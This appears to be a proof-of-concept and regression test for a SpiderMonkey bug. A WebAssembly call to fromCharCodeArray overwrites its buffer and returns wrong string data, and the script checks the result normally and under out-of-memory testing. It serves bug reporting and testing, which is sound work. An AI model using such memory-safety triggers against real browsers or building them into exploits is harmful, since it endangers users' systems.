// Minimal PoC 2: Wrong data (24 elements, no crash)
// Requires SpiderMonkey shell with wasm.gc + wasm.stringref enabled.
// Run: ./js poc-wrong-data-24.js

let wat_buggy = `(module
  (type $arr (array (mut i16)))
  (func $fromCharCodeArray
    (import "wasm:js-string" "fromCharCodeArray")
    (param (ref null $arr) i32 i32)
    (result (ref extern)))
  (func (export "test") (result externref)
    ;; 24 elements → bug writes 48 uint16_t (fits ~49-capacity Vector)
    ;; No crash, but first 8 chars come from DataHeader (zeros) when fallback hits
    (call $fromCharCodeArray
      (array.new $arr (i32.const 0x41) (i32.const 24))
      (i32.const 0)
      (i32.const 24)))
)`;

let bytes_buggy = wasmTextToBinary(wat_buggy);
let mod = new WebAssembly.Module(bytes_buggy, {builtins: ['js-string']});
let inst = new WebAssembly.Instance(mod, {}).exports;

print("[Without oomTest] Expect 24 'A' characters");
let s = inst.test();
if (s !== "A".repeat(24)) {
  print("Expected: '" + "A".repeat(24) + "'");
  print("Got:      '" + s + "'");
  print("Length:   " + s.length);
  // Show first 12 char codes to highlight header zeros
  let n = Math.min(12, s.length);
  let codes = [];
  for (let i = 0; i < n; i++) codes.push("0x" + s.charCodeAt(i).toString(16));
  print("First " + n + " codes: [" + codes.join(", ") + "]");
  // Ensure the PoC fails under jit-test
  assertEq(s, "A".repeat(24));
}else{
  print("Data is correct");
}
print("[With oomTest] Expect 24 'A' characters");

oomTest(() => {
  let s = inst.test();
  if (s !== "A".repeat(24)) {
    print("Expected: '" + "A".repeat(24) + "'");
    print("Got:      '" + s + "'");
    print("Length:   " + s.length);
    // Show first 12 char codes to highlight header zeros
    let n = Math.min(12, s.length);
    let codes = [];
    for (let i = 0; i < n; i++) codes.push("0x" + s.charCodeAt(i).toString(16));
    print("First " + n + " codes: [" + codes.join(", ") + "]");
    // Ensure the PoC fails under jit-test
    assertEq(s, "A".repeat(24));
  }
});

